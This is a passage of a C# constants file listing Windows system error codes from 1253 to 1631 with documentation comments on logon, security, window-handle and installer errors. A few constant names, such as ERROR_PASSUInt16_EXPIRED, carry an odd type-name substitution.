        public const int ERROR_BAD_USER_PROFILE = 1253;
        /// <summary>
        /// This operation is not supported on a Microsoft Small Business Server
        /// </summary>
        public const int ERROR_NOT_SUPPORTED_ON_SBS = 1254;
        /// <summary>
        /// The server machine is shutting down.
        /// </summary>
        public const int ERROR_SERVER_SHUTDOWN_IN_PROGRESS = 1255;
        /// <summary>
        /// The remote system is not available. For information about network troubleshooting, see Windows Help.
        /// </summary>
        public const int ERROR_HOST_DOWN = 1256;
        /// <summary>
        /// The security identifier provided is not from an account domain.
        /// </summary>
        public const int ERROR_NON_ACCOUNT_SID = 1257;
        /// <summary>
        /// The security identifier provided does not have a domain component.
        /// </summary>
        public const int ERROR_NON_DOMAIN_SID = 1258;
        /// <summary>
        /// AppHelp dialog canceled thus preventing the application from starting.
        /// </summary>
        public const int ERROR_APPHELP_BLOCK = 1259;
        /// <summary>
        /// Windows cannot open this program because it has been prevented by a software restriction policy. For more information, open Event Viewer or contact your system administrator.
        /// </summary>
        public const int ERROR_ACCESS_DISABLED_BY_POLICY = 1260;
        /// <summary>
        /// A program attempt to use an invalid register value.  Normally caused by an uninitialized register. This error is Itanium specific.
        /// </summary>
        public const int ERROR_REG_NAT_CONSUMPTION = 1261;
        /// <summary>
        /// The share is currently offline or does not exist.
        /// </summary>
        public const int ERROR_CSCSHARE_OFFLINE = 1262;
        /// <summary>
        /// The kerberos protocol encountered an error while validating the
        /// KDC certificate during smartcard logon.
        /// </summary>
        public const int ERROR_PKINIT_FAILURE = 1263;
        /// <summary>
        /// The kerberos protocol encountered an error while attempting to utilize
        /// the smartcard subsystem.
        /// </summary>
        public const int ERROR_SMARTCARD_SUBSYSTEM_FAILURE = 1264;
        /// <summary>
        /// The system detected a possible attempt to compromise security. Please ensure that you can contact the server that authenticated you.
        /// </summary>
        public const int ERROR_DOWNGRADE_DETECTED = 1265;
        /// <summary>
        /// The machine is locked and can not be shut down without the force option.
        /// </summary>
        public const int ERROR_MACHINE_LOCKED = 1271;
        /// <summary>
        /// An application-defined callback gave invalid data when called.
        /// </summary>
        public const int ERROR_CALLBACK_SUPPLIED_INVALID_DATA = 1273;
        /// <summary>
        /// The group policy framework should call the extension in the synchronous foreground policy refresh.
        /// </summary>
        public const int ERROR_SYNC_FOREGROUND_REFRESH_REQUIRED = 1274;
        /// <summary>
        /// This driver has been blocked from loading
        /// </summary>
        public const int ERROR_DRIVER_BLOCKED = 1275;
        /// <summary>
        /// A dynamic link library (DLL) referenced a module that was neither a DLL nor the process's executable image.
        /// </summary>
        public const int ERROR_INVALID_IMPORT_OF_NON_DLL = 1276;
        /// <summary>
        /// No information avialable.
        /// </summary>
        public const int ERROR_ACCESS_DISABLED_WEBBLADE = 1277;
        /// <summary>
        /// No information avialable.
        /// </summary>
        public const int ERROR_ACCESS_DISABLED_WEBBLADE_TAMPER = 1278;
        /// <summary>
        /// No information avialable.
        /// </summary>
        public const int ERROR_RECOVERY_FAILURE = 1279;
        /// <summary>
        /// No information avialable.
        /// </summary>
        public const int ERROR_ALREADY_FIBER = 1280;
        /// <summary>
        /// No information avialable.
        /// </summary>
        public const int ERROR_ALREADY_THREAD = 1281;
        /// <summary>
        /// No information avialable.
        /// </summary>
        public const int ERROR_STACK_BUFFER_OVERRUN = 1282;
        /// <summary>
        /// No information avialable.
        /// </summary>
        public const int ERROR_PARAMETER_QUOTA_EXCEEDED = 1283;
        /// <summary>
        /// No information avialable.
        /// </summary>
        public const int ERROR_DEBUGGER_INACTIVE = 1284;
        /// <summary>
        /// No information avialable.
        /// </summary>
        public const int ERROR_DELAY_LOAD_FAILED = 1285;
        /// <summary>
        /// No information avialable.
        /// </summary>
        public const int ERROR_VDM_DISALLOWED = 1286;
        /// <summary>
        /// Not all privileges referenced are assigned to the caller.
        /// </summary>
        public const int ERROR_NOT_ALL_ASSIGNED = 1300;
        /// <summary>
        /// Some mapping between account names and security IDs was not done.
        /// </summary>
        public const int ERROR_SOME_NOT_MAPPED = 1301;
        /// <summary>
        /// No system quota limits are specifically set for this account.
        /// </summary>
        public const int ERROR_NO_QUOTAS_FOR_ACCOUNT = 1302;
        /// <summary>
        /// No encryption key is available. A well-known encryption key was returned.
        /// </summary>
        public const int ERROR_LOCAL_USER_SESSION_KEY = 1303;
        /// <summary>
        /// The password is too complex to be converted to a LAN Manager password. The LAN Manager password returned is a NULL string.
        /// </summary>
        public const int ERROR_NULL_LM_PASSUInt16 = 1304;
        /// <summary>
        /// The revision level is unknown.
        /// </summary>
        public const int ERROR_UNKNOWN_REVISION = 1305;
        /// <summary>
        /// Indicates two revision levels are incompatible.
        /// </summary>
        public const int ERROR_REVISION_MISMATCH = 1306;
        /// <summary>
        /// This security ID may not be assigned as the owner of this object.
        /// </summary>
        public const int ERROR_INVALID_OWNER = 1307;
        /// <summary>
        /// This security ID may not be assigned as the primary group of an object.
        /// </summary>
        public const int ERROR_INVALID_PRIMARY_GROUP = 1308;
        /// <summary>
        /// An attempt has been made to operate on an impersonation token by a thread that is not currently impersonating a client.
        /// </summary>
        public const int ERROR_NO_IMPERSONATION_TOKEN = 1309;
        /// <summary>
        /// The group may not be disabled.
        /// </summary>
        public const int ERROR_CANT_DISABLE_MANDATORY = 1310;
        /// <summary>
        /// There are currently no logon servers available to service the logon request.
        /// </summary>
        public const int ERROR_NO_LOGON_SERVERS = 1311;
        /// <summary>
        /// A specified logon session does not exist. It may already have been terminated.
        /// </summary>
        public const int ERROR_NO_SUCH_LOGON_SESSION = 1312;
        /// <summary>
        /// A specified privilege does not exist.
        /// </summary>
        public const int ERROR_NO_SUCH_PRIVILEGE = 1313;
        /// <summary>
        /// A required privilege is not held by the client.
        /// </summary>
        public const int ERROR_PRIVILEGE_NOT_HELD = 1314;
        /// <summary>
        /// The name provided is not a properly formed account name.
        /// </summary>
        public const int ERROR_INVALID_ACCOUNT_NAME = 1315;
        /// <summary>
        /// The specified user already exists.
        /// </summary>
        public const int ERROR_USER_EXISTS = 1316;
        /// <summary>
        /// The specified user does not exist.
        /// </summary>
        public const int ERROR_NO_SUCH_USER = 1317;
        /// <summary>
        /// The specified group already exists.
        /// </summary>
        public const int ERROR_GROUP_EXISTS = 1318;
        /// <summary>
        /// The specified group does not exist.
        /// </summary>
        public const int ERROR_NO_SUCH_GROUP = 1319;
        /// <summary>
        /// Either the specified user account is already a member of the specified group, or the specified group cannot be deleted because it contains a member.
        /// </summary>
        public const int ERROR_MEMBER_IN_GROUP = 1320;
        /// <summary>
        /// The specified user account is not a member of the specified group account.
        /// </summary>
        public const int ERROR_MEMBER_NOT_IN_GROUP = 1321;
        /// <summary>
        /// The last remaining administration account cannot be disabled or deleted.
        /// </summary>
        public const int ERROR_LAST_ADMIN = 1322;
        /// <summary>
        /// Unable to update the password. The value provided as the current password is incorrect.
        /// </summary>
        public const int ERROR_WRONG_PASSWORD = 1323;
        /// <summary>
        /// Unable to update the password. The value provided for the new password contains values that are not allowed in passwords.
        /// </summary>
        public const int ERROR_ILL_FORMED_PASSWORD = 1324;
        /// <summary>
        /// Unable to update the password. The value provided for the new password does not meet the length, complexity, or history requirement of the domain.
        /// </summary>
        public const int ERROR_PASSWORD_RESTRICTION = 1325;
        /// <summary>
        /// Logon failure: unknown user name or bad password.
        /// </summary>
        public const int ERROR_LOGON_FAILURE = 1326;
        /// <summary>
        /// Logon failure: user account restriction.  Possible reasons are blank passwords not allowed, logon hour restrictions, or a policy restriction has been enforced.
        /// </summary>
        public const int ERROR_ACCOUNT_RESTRICTION = 1327;
        /// <summary>
        /// Logon failure: account logon time restriction violation.
        /// </summary>
        public const int ERROR_INVALID_LOGON_HOURS = 1328;
        /// <summary>
        /// Logon failure: user not allowed to log on to this computer.
        /// </summary>
        public const int ERROR_INVALID_WORKSTATION = 1329;
        /// <summary>
        /// Logon failure: the specified account password has expired.
        /// </summary>
        public const int ERROR_PASSUInt16_EXPIRED = 1330;
        /// <summary>
        /// Logon failure: account currently disabled.
        /// </summary>
        public const int ERROR_ACCOUNT_DISABLED = 1331;
        /// <summary>
        /// No mapping between account names and security IDs was done.
        /// </summary>
        public const int ERROR_NONE_MAPPED = 1332;
        /// <summary>
        /// Too many local user identifiers (LUIDs) were requested at one time.
        /// </summary>
        public const int ERROR_TOO_MANY_LUIDS_REQUESTED = 1333;
        /// <summary>
        /// No more local user identifiers (LUIDs) are available.
        /// </summary>
        public const int ERROR_LUIDS_EXHAUSTED = 1334;
        /// <summary>
        /// The subauthority part of a security ID is invalid for this particular use.
        /// </summary>
        public const int ERROR_INVALID_SUB_AUTHORITY = 1335;
        /// <summary>
        /// The access control list (ACL) structure is invalid.
        /// </summary>
        public const int ERROR_INVALID_ACL = 1336;
        /// <summary>
        /// The security ID structure is invalid.
        /// </summary>
        public const int ERROR_INVALID_SID = 1337;
        /// <summary>
        /// The security descriptor structure is invalid.
        /// </summary>
        public const int ERROR_INVALID_SECURITY_DESCR = 1338;
        /// <summary>
        /// The inherited access control list (ACL) or access control entry (ACE) could not be built.
        /// </summary>
        public const int ERROR_BAD_INHERITANCE_ACL = 1340;
        /// <summary>
        /// The server is currently disabled.
        /// </summary>
        public const int ERROR_SERVER_DISABLED = 1341;
        /// <summary>
        /// The server is currently enabled.
        /// </summary>
        public const int ERROR_SERVER_NOT_DISABLED = 1342;
        /// <summary>
        /// The value provided was an invalid value for an identifier authority.
        /// </summary>
        public const int ERROR_INVALID_ID_AUTHORITY = 1343;
        /// <summary>
        /// No more memory is available for security information updates.
        /// </summary>
        public const int ERROR_ALLOTTED_SPACE_EXCEEDED = 1344;
        /// <summary>
        /// The specified attributes are invalid, or incompatible with the attributes for the group as a whole.
        /// </summary>
        public const int ERROR_INVALID_GROUP_ATTRIBUTES = 1345;
        /// <summary>
        /// Either a required impersonation level was not provided, or the provided impersonation level is invalid.
        /// </summary>
        public const int ERROR_BAD_IMPERSONATION_LEVEL = 1346;
        /// <summary>
        /// Cannot open an anonymous level security token.
        /// </summary>
        public const int ERROR_CANT_OPEN_ANONYMOUS = 1347;
        /// <summary>
        /// The validation information class requested was invalid.
        /// </summary>
        public const int ERROR_BAD_VALIDATION_CLASS = 1348;
        /// <summary>
        /// The type of the token is inappropriate for its attempted use.
        /// </summary>
        public const int ERROR_BAD_TOKEN_TYPE = 1349;
        /// <summary>
        /// Unable to perform a security operation on an object that has no associated security.
        /// </summary>
        public const int ERROR_NO_SECURITY_ON_OBJECT = 1350;
        /// <summary>
        /// Configuration information could not be read from the domain controller, either because the machine is unavailable, or access has been denied.
        /// </summary>
        public const int ERROR_CANT_ACCESS_DOMAIN_INFO = 1351;
        /// <summary>
        /// The security account manager (SAM) or local security authority (LSA) server was in the wrong state to perform the security operation.
        /// </summary>
        public const int ERROR_INVALID_SERVER_STATE = 1352;
        /// <summary>
        /// The domain was in the wrong state to perform the security operation.
        /// </summary>
        public const int ERROR_INVALID_DOMAIN_STATE = 1353;
        /// <summary>
        /// This operation is only allowed for the Primary Domain Controller of the domain.
        /// </summary>
        public const int ERROR_INVALID_DOMAIN_ROLE = 1354;
        /// <summary>
        /// The specified domain either does not exist or could not be contacted.
        /// </summary>
        public const int ERROR_NO_SUCH_DOMAIN = 1355;
        /// <summary>
        /// The specified domain already exists.
        /// </summary>
        public const int ERROR_DOMAIN_EXISTS = 1356;
        /// <summary>
        /// An attempt was made to exceed the limit on the number of domains per server.
        /// </summary>
        public const int ERROR_DOMAIN_LIMIT_EXCEEDED = 1357;
        /// <summary>
        /// Unable to complete the requested operation because of either a catastrophic media failure or a data structure corruption on the disk.
        /// </summary>
        public const int ERROR_INTERNAL_DB_CORRUPTION = 1358;
        /// <summary>
        /// An internal error occurred.
        /// </summary>
        public const int ERROR_INTERNAL_ERROR = 1359;
        /// <summary>
        /// Generic access types were contained in an access mask which should already be mapped to nongeneric types.
        /// </summary>
        public const int ERROR_GENERIC_NOT_MAPPED = 1360;
        /// <summary>
        /// A security descriptor is not in the right format (absolute or self-relative).
        /// </summary>
        public const int ERROR_BAD_DESCRIPTOR_FORMAT = 1361;
        /// <summary>
        /// The requested action is restricted for use by logon processes only. The calling process has not registered as a logon process.
        /// </summary>
        public const int ERROR_NOT_LOGON_PROCESS = 1362;
        /// <summary>
        /// Cannot start a new logon session with an ID that is already in use.
        /// </summary>
        public const int ERROR_LOGON_SESSION_EXISTS = 1363;
        /// <summary>
        /// A specified authentication package is unknown.
        /// </summary>
        public const int ERROR_NO_SUCH_PACKAGE = 1364;
        /// <summary>
        /// The logon session is not in a state that is consistent with the requested operation.
        /// </summary>
        public const int ERROR_BAD_LOGON_SESSION_STATE = 1365;
        /// <summary>
        /// The logon session ID is already in use.
        /// </summary>
        public const int ERROR_LOGON_SESSION_COLLISION = 1366;
        /// <summary>
        /// A logon request contained an invalid logon type value.
        /// </summary>
        public const int ERROR_INVALID_LOGON_TYPE = 1367;
        /// <summary>
        /// Unable to impersonate using a named pipe until data has been read from that pipe.
        /// </summary>
        public const int ERROR_CANNOT_IMPERSONATE = 1368;
        /// <summary>
        /// The transaction state of a registry subtree is incompatible with the requested operation.
        /// </summary>
        public const int ERROR_RXACT_INVALID_STATE = 1369;
        /// <summary>
        /// An internal security database corruption has been encountered.
        /// </summary>
        public const int ERROR_RXACT_COMMIT_FAILURE = 1370;
        /// <summary>
        /// Cannot perform this operation on built-in accounts.
        /// </summary>
        public const int ERROR_SPECIAL_ACCOUNT = 1371;
        /// <summary>
        /// Cannot perform this operation on this built-in special group.
        /// </summary>
        public const int ERROR_SPECIAL_GROUP = 1372;
        /// <summary>
        /// Cannot perform this operation on this built-in special user.
        /// </summary>
        public const int ERROR_SPECIAL_USER = 1373;
        /// <summary>
        /// The user cannot be removed from a group because the group is currently the user's primary group.
        /// </summary>
        public const int ERROR_MEMBERS_PRIMARY_GROUP = 1374;
        /// <summary>
        /// The token is already in use as a primary token.
        /// </summary>
        public const int ERROR_TOKEN_ALREADY_IN_USE = 1375;
        /// <summary>
        /// The specified local group does not exist.
        /// </summary>
        public const int ERROR_NO_SUCH_ALIAS = 1376;
        /// <summary>
        /// The specified account name is not a member of the local group.
        /// </summary>
        public const int ERROR_MEMBER_NOT_IN_ALIAS = 1377;
        /// <summary>
        /// The specified account name is already a member of the local group.
        /// </summary>
        public const int ERROR_MEMBER_IN_ALIAS = 1378;
        /// <summary>
        /// The specified local group already exists.
        /// </summary>
        public const int ERROR_ALIAS_EXISTS = 1379;
        /// <summary>
        /// Logon failure: the user has not been granted the requested logon type at this computer.
        /// </summary>
        public const int ERROR_LOGON_NOT_GRANTED = 1380;
        /// <summary>
        /// The maximum number of secrets that may be stored in a single system has been exceeded.
        /// </summary>
        public const int ERROR_TOO_MANY_SECRETS = 1381;
        /// <summary>
        /// The length of a secret exceeds the maximum length allowed.
        /// </summary>
        public const int ERROR_SECRET_TOO_Int32 = 1382;
        /// <summary>
        /// The local security authority database contains an internal inconsistency.
        /// </summary>
        public const int ERROR_INTERNAL_DB_ERROR = 1383;
        /// <summary>
        /// During a logon attempt, the user's security context accumulated too many security IDs.
        /// </summary>
        public const int ERROR_TOO_MANY_CONTEXT_IDS = 1384;
        /// <summary>
        /// Logon failure: the user has not been granted the requested logon type at this computer.
        /// </summary>
        public const int ERROR_LOGON_TYPE_NOT_GRANTED = 1385;
        /// <summary>
        /// A cross-encrypted password is necessary to change a user password.
        /// </summary>
        public const int ERROR_NT_CROSS_ENCRYPTION_REQUIRED = 1386;
        /// <summary>
        /// A member could not be added to or removed from the local group because the member does not exist.
        /// </summary>
        public const int ERROR_NO_SUCH_MEMBER = 1387;
        /// <summary>
        /// A new member could not be added to a local group because the member has the wrong account type.
        /// </summary>
        public const int ERROR_INVALID_MEMBER = 1388;
        /// <summary>
        /// Too many security IDs have been specified.
        /// </summary>
        public const int ERROR_TOO_MANY_SIDS = 1389;
        /// <summary>
        /// A cross-encrypted password is necessary to change this user password.
        /// </summary>
        public const int ERROR_LM_CROSS_ENCRYPTION_REQUIRED = 1390;
        /// <summary>
        /// Indicates an ACL contains no inheritable components.
        /// </summary>
        public const int ERROR_NO_INHERITANCE = 1391;
        /// <summary>
        /// The file or directory is corrupted and unreadable.
        /// </summary>
        public const int ERROR_FILE_CORRUPT = 1392;
        /// <summary>
        /// The disk structure is corrupted and unreadable.
        /// </summary>
        public const int ERROR_DISK_CORRUPT = 1393;
        /// <summary>
        /// There is no user session key for the specified logon session.
        /// </summary>
        public const int ERROR_NO_USER_SESSION_KEY = 1394;
        /// <summary>
        /// The service being accessed is licensed for a particular number of connections.
        /// No more connections can be made to the service at this time because there are already as many connections as the service can accept.
        /// </summary>
        public const int ERROR_LICENSE_QUOTA_EXCEEDED = 1395;
        /// <summary>
        /// Logon Failure: The target account name is incorrect.
        /// </summary>
        public const int ERROR_WRONG_TARGET_NAME = 1396;
        /// <summary>
        /// Mutual Authentication failed. The server's password is out of date at the domain controller.
        /// </summary>
        public const int ERROR_MUTUAL_AUTH_FAILED = 1397;
        /// <summary>
        /// There is a time and/or date difference between the client and server.
        /// </summary>
        public const int ERROR_TIME_SKEW = 1398;
        /// <summary>
        /// This operation can not be performed on the current domain.
        /// </summary>
        public const int ERROR_CURRENT_DOMAIN_NOT_ALLOWED = 1399;
        /// <summary>
        /// Invalid window handle.
        /// </summary>
        public const int ERROR_INVALID_WINDOW_HANDLE = 1400;
        /// <summary>
        /// Invalid menu handle.
        /// </summary>
        public const int ERROR_INVALID_MENU_HANDLE = 1401;
        /// <summary>
        /// Invalid cursor handle.
        /// </summary>
        public const int ERROR_INVALID_CURSOR_HANDLE = 1402;
        /// <summary>
        /// Invalid accelerator table handle.
        /// </summary>
        public const int ERROR_INVALID_ACCEL_HANDLE = 1403;
        /// <summary>
        /// Invalid hook handle.
        /// </summary>
        public const int ERROR_INVALID_HOOK_HANDLE = 1404;
        /// <summary>
        /// Invalid handle to a multiple-window position structure.
        /// </summary>
        public const int ERROR_INVALID_DWP_HANDLE = 1405;
        /// <summary>
        /// Cannot create a top-level child window.
        /// </summary>
        public const int ERROR_TLW_WITH_WSCHILD = 1406;
        /// <summary>
        /// Cannot find window class.
        /// </summary>
        public const int ERROR_CANNOT_FIND_WND_CLASS = 1407;
        /// <summary>
        /// Invalid window; it belongs to other thread.
        /// </summary>
        public const int ERROR_WINDOW_OF_OTHER_THREAD = 1408;
        /// <summary>
        /// Hot key is already registered.
        /// </summary>
        public const int ERROR_HOTKEY_ALREADY_REGISTERED = 1409;
        /// <summary>
        /// Class already exists.
        /// </summary>
        public const int ERROR_CLASS_ALREADY_EXISTS = 1410;
        /// <summary>
        /// Class does not exist.
        /// </summary>
        public const int ERROR_CLASS_DOES_NOT_EXIST = 1411;
        /// <summary>
        /// Class still has open windows.
        /// </summary>
        public const int ERROR_CLASS_HAS_WINDOWS = 1412;
        /// <summary>
        /// Invalid index.
        /// </summary>
        public const int ERROR_INVALID_INDEX = 1413;
        /// <summary>
        /// Invalid icon handle.
        /// </summary>
        public const int ERROR_INVALID_ICON_HANDLE = 1414;
        /// <summary>
        /// Using private DIALOG window words.
        /// </summary>
        public const int ERROR_PRIVATE_DIALOG_INDEX = 1415;
        /// <summary>
        /// The list box identifier was not found.
        /// </summary>
        public const int ERROR_LISTBOX_ID_NOT_FOUND = 1416;
        /// <summary>
        /// No wildcards were found.
        /// </summary>
        public const int ERROR_NO_WILDCARD_CHARACTERS = 1417;
        /// <summary>
        /// Thread does not have a clipboard open.
        /// </summary>
        public const int ERROR_CLIPBOARD_NOT_OPEN = 1418;
        /// <summary>
        /// Hot key is not registered.
        /// </summary>
        public const int ERROR_HOTKEY_NOT_REGISTERED = 1419;
        /// <summary>
        /// The window is not a valid dialog window.
        /// </summary>
        public const int ERROR_WINDOW_NOT_DIALOG = 1420;
        /// <summary>
        /// Control ID not found.
        /// </summary>
        public const int ERROR_CONTROL_ID_NOT_FOUND = 1421;
        /// <summary>
        /// Invalid message for a combo box because it does not have an edit control.
        /// </summary>
        public const int ERROR_INVALID_COMBOBOX_MESSAGE = 1422;
        /// <summary>
        /// The window is not a combo box.
        /// </summary>
        public const int ERROR_WINDOW_NOT_COMBOBOX = 1423;
        /// <summary>
        /// Height must be less than 256.
        /// </summary>
        public const int ERROR_INVALID_EDIT_HEIGHT = 1424;
        /// <summary>
        /// Invalid device context (DC) handle.
        /// </summary>
        public const int ERROR_DC_NOT_FOUND = 1425;
        /// <summary>
        /// Invalid hook procedure type.
        /// </summary>
        public const int ERROR_INVALID_HOOK_FILTER = 1426;
        /// <summary>
        /// Invalid hook procedure.
        /// </summary>
        public const int ERROR_INVALID_FILTER_PROC = 1427;
        /// <summary>
        /// Cannot set nonlocal hook without a module handle.
        /// </summary>
        public const int ERROR_HOOK_NEEDS_HMOD = 1428;
        /// <summary>
        /// This hook procedure can only be set globally.
        /// </summary>
        public const int ERROR_GLOBAL_ONLY_HOOK = 1429;
        /// <summary>
        /// The journal hook procedure is already installed.
        /// </summary>
        public const int ERROR_JOURNAL_HOOK_SET = 1430;
        /// <summary>
        /// The hook procedure is not installed.
        /// </summary>
        public const int ERROR_HOOK_NOT_INSTALLED = 1431;
        /// <summary>
        /// Invalid message for single-selection list box.
        /// </summary>
        public const int ERROR_INVALID_LB_MESSAGE = 1432;
        /// <summary>
        /// LB_SETCOUNT sent to non-lazy list box.
        /// </summary>
        public const int ERROR_SETCOUNT_ON_BAD_LB = 1433;
        /// <summary>
        /// This list box does not support tab stops.
        /// </summary>
        public const int ERROR_LB_WITHOUT_TABSTOPS = 1434;
        /// <summary>
        /// Cannot destroy object created by another thread.
        /// </summary>
        public const int ERROR_DESTROY_OBJECT_OF_OTHER_THREAD = 1435;
        /// <summary>
        /// Child windows cannot have menus.
        /// </summary>
        public const int ERROR_CHILD_WINDOW_MENU = 1436;
        /// <summary>
        /// The window does not have a system menu.
        /// </summary>
        public const int ERROR_NO_SYSTEM_MENU = 1437;
        /// <summary>
        /// Invalid message box style.
        /// </summary>
        public const int ERROR_INVALID_MSGBOX_STYLE = 1438;
        /// <summary>
        /// Invalid system-wide (SPI_*) parameter.
        /// </summary>
        public const int ERROR_INVALID_SPI_VALUE = 1439;
        /// <summary>
        /// Screen already locked.
        /// </summary>
        public const int ERROR_SCREEN_ALREADY_LOCKED = 1440;
        /// <summary>
        /// All handles to windows in a multiple-window position structure must have the same parent.
        /// </summary>
        public const int ERROR_HWNDS_HAVE_DIFF_PARENT = 1441;
        /// <summary>
        /// The window is not a child window.
        /// </summary>
        public const int ERROR_NOT_CHILD_WINDOW = 1442;
        /// <summary>
        /// Invalid GW_* command.
        /// </summary>
        public const int ERROR_INVALID_GW_COMMAND = 1443;
        /// <summary>
        /// Invalid thread identifier.
        /// </summary>
        public const int ERROR_INVALID_THREAD_ID = 1444;
        /// <summary>
        /// Cannot process a message from a window that is not a multiple document interface (MDI) window.
        /// </summary>
        public const int ERROR_NON_MDICHILD_WINDOW = 1445;
        /// <summary>
        /// Popup menu already active.
        /// </summary>
        public const int ERROR_POPUP_ALREADY_ACTIVE = 1446;
        /// <summary>
        /// The window does not have scroll bars.
        /// </summary>
        public const int ERROR_NO_SCROLLBARS = 1447;
        /// <summary>
        /// Scroll bar range cannot be greater than MAXLONG.
        /// </summary>
        public const int ERROR_INVALID_SCROLLBAR_RANGE = 1448;
        /// <summary>
        /// Cannot show or remove the window in the way specified.
        /// </summary>
        public const int ERROR_INVALID_SHOWWIN_COMMAND = 1449;
        /// <summary>
        /// Insufficient system resources exist to complete the requested service.
        /// </summary>
        public const int ERROR_NO_SYSTEM_RESOURCES = 1450;
        /// <summary>
        /// Insufficient system resources exist to complete the requested service.
        /// </summary>
        public const int ERROR_NONPAGED_SYSTEM_RESOURCES = 1451;
        /// <summary>
        /// Insufficient system resources exist to complete the requested service.
        /// </summary>
        public const int ERROR_PAGED_SYSTEM_RESOURCES = 1452;
        /// <summary>
        /// Insufficient quota to complete the requested service.
        /// </summary>
        public const int ERROR_WORKING_SET_QUOTA = 1453;
        /// <summary>
        /// Insufficient quota to complete the requested service.
        /// </summary>
        public const int ERROR_PAGEFILE_QUOTA = 1454;
        /// <summary>
        /// The paging file is too small for this operation to complete.
        /// </summary>
        public const int ERROR_COMMITMENT_LIMIT = 1455;
        /// <summary>
        /// A menu item was not found.
        /// </summary>
        public const int ERROR_MENU_ITEM_NOT_FOUND = 1456;
        /// <summary>
        /// Invalid keyboard layout handle.
        /// </summary>
        public const int ERROR_INVALID_KEYBOARD_HANDLE = 1457;
        /// <summary>
        /// Hook type not allowed.
        /// </summary>
        public const int ERROR_HOOK_TYPE_NOT_ALLOWED = 1458;
        /// <summary>
        /// This operation requires an interactive window station.
        /// </summary>
        public const int ERROR_REQUIRES_INTERACTIVE_WINDOWSTATION = 1459;
        /// <summary>
        /// This operation returned because the timeout period expired.
        /// </summary>
        public const int ERROR_TIMEOUT = 1460;
        /// <summary>
        /// Invalid monitor handle.
        /// </summary>
        public const int ERROR_INVALID_MONITOR_HANDLE = 1461;
        /// <summary>
        /// The event log file is corrupted.
        /// </summary>
        public const int ERROR_EVENTLOG_FILE_CORRUPT = 1500;
        /// <summary>
        /// No event log file could be opened, so the event logging service did not start.
        /// </summary>
        public const int ERROR_EVENTLOG_CANT_START = 1501;
        /// <summary>
        /// The event log file is full.
        /// </summary>
        public const int ERROR_LOG_FILE_FULL = 1502;
        /// <summary>
        /// The event log file has changed between read operations.
        /// </summary>
        public const int ERROR_EVENTLOG_FILE_CHANGED = 1503;
        /// <summary>
        /// The Windows Installer Service could not be accessed. This can occur if you are running Windows in safe mode, or if the Windows Installer is not correctly installed. Contact your support personnel for assistance.
        /// </summary>
        public const int ERROR_INSTALL_SERVICE_FAILURE = 1601;
        /// <summary>
        /// User cancelled installation.
        /// </summary>
        public const int ERROR_INSTALL_USEREXIT = 1602;
        /// <summary>
        /// Fatal error during installation.
        /// </summary>
        public const int ERROR_INSTALL_FAILURE = 1603;
        /// <summary>
        /// Installation suspended, incomplete.
        /// </summary>
        public const int ERROR_INSTALL_SUSPEND = 1604;
        /// <summary>
        /// This action is only valid for products that are currently installed.
        /// </summary>
        public const int ERROR_UNKNOWN_PRODUCT = 1605;
        /// <summary>
        /// Feature ID not registered.
        /// </summary>
        public const int ERROR_UNKNOWN_FEATURE = 1606;
        /// <summary>
        /// Component ID not registered.
        /// </summary>
        public const int ERROR_UNKNOWN_COMPONENT = 1607;
        /// <summary>
        /// Unknown property.
        /// </summary>
        public const int ERROR_UNKNOWN_PROPERTY = 1608;
        /// <summary>
        /// Handle is in an invalid state.
        /// </summary>
        public const int ERROR_INVALID_HANDLE_STATE = 1609;
        /// <summary>
        /// The configuration data for this product is corrupt.  Contact your support personnel.
        /// </summary>
        public const int ERROR_BAD_CONFIGURATION = 1610;
        /// <summary>
        /// Component qualifier not present.
        /// </summary>
        public const int ERROR_INDEX_ABSENT = 1611;
        /// <summary>
        /// The installation source for this product is not available.  Verify that the source exists and that you can access it.
        /// </summary>
        public const int ERROR_INSTALL_SOURCE_ABSENT = 1612;
        /// <summary>
        /// This installation package cannot be installed by the Windows Installer service.  You must install a Windows service pack that contains a newer version of the Windows Installer service.
        /// </summary>
        public const int ERROR_INSTALL_PACKAGE_VERSION = 1613;
        /// <summary>
        /// Product is uninstalled.
        /// </summary>
        public const int ERROR_PRODUCT_UNINSTALLED = 1614;
        /// <summary>
        /// SQL query syntax invalid or unsupported.
        /// </summary>
        public const int ERROR_BAD_QUERY_SYNTAX = 1615;
        /// <summary>
        /// Record field does not exist.
        /// </summary>
        public const int ERROR_INVALID_FIELD = 1616;
        /// <summary>
        /// The device has been removed.
        /// </summary>
        public const int ERROR_DEVICE_REMOVED = 1617;
        /// <summary>
        /// Another installation is already in progress.  Complete that installation before proceeding with this install.
        /// </summary>
        public const int ERROR_INSTALL_ALREADY_RUNNING = 1618;
        /// <summary>
        /// This installation package could not be opened.  Verify that the package exists and that you can access it, or contact the application vendor to verify that this is a valid Windows Installer package.
        /// </summary>
        public const int ERROR_INSTALL_PACKAGE_OPEN_FAILED = 1619;
        /// <summary>
        /// This installation package could not be opened.  Contact the application vendor to verify that this is a valid Windows Installer package.
        /// </summary>
        public const int ERROR_INSTALL_PACKAGE_INVALID = 1620;
        /// <summary>
        /// There was an error starting the Windows Installer service user interface.  Contact your support personnel.
        /// </summary>
        public const int ERROR_INSTALL_UI_FAILURE = 1621;
        /// <summary>
        /// Error opening installation log file. Verify that the specified log file location exists and that you can write to it.
        /// </summary>
        public const int ERROR_INSTALL_LOG_FAILURE = 1622;
        /// <summary>
        /// The language of this installation package is not supported by your system.
        /// </summary>
        public const int ERROR_INSTALL_LANGUAGE_UNSUPPORTED = 1623;
        /// <summary>
        /// Error applying transforms.  Verify that the specified transform paths are valid.
        /// </summary>
        public const int ERROR_INSTALL_TRANSFORM_FAILURE = 1624;
        /// <summary>
        /// This installation is forbidden by system policy.  Contact your system administrator.
        /// </summary>
        public const int ERROR_INSTALL_PACKAGE_REJECTED = 1625;
        /// <summary>
        /// Function could not be executed.
        /// </summary>
        public const int ERROR_FUNCTION_NOT_CALLED = 1626;
        /// <summary>
        /// Function failed during execution.
        /// </summary>
        public const int ERROR_FUNCTION_FAILED = 1627;
        /// <summary>
        /// Invalid or unknown table specified.
        /// </summary>
        public const int ERROR_INVALID_TABLE = 1628;
        /// <summary>
        /// Data supplied is of wrong type.
        /// </summary>
        public const int ERROR_DATATYPE_MISMATCH = 1629;
        /// <summary>
        /// Data of this type is not supported.
        /// </summary>
        public const int ERROR_UNSUPPORTED_TYPE = 1630;
        /// <summary>
        /// The Windows Installer service failed to start.  Contact your support personnel.
        /// </summary>
        public const int ERROR_CREATE_FAILED = 1631;
        /// <summary>
        /// The Temp folder is on a drive that is full or is inaccessible. Free up space on the drive or verify that you have write permission on the Temp folder.
        /// </summary>
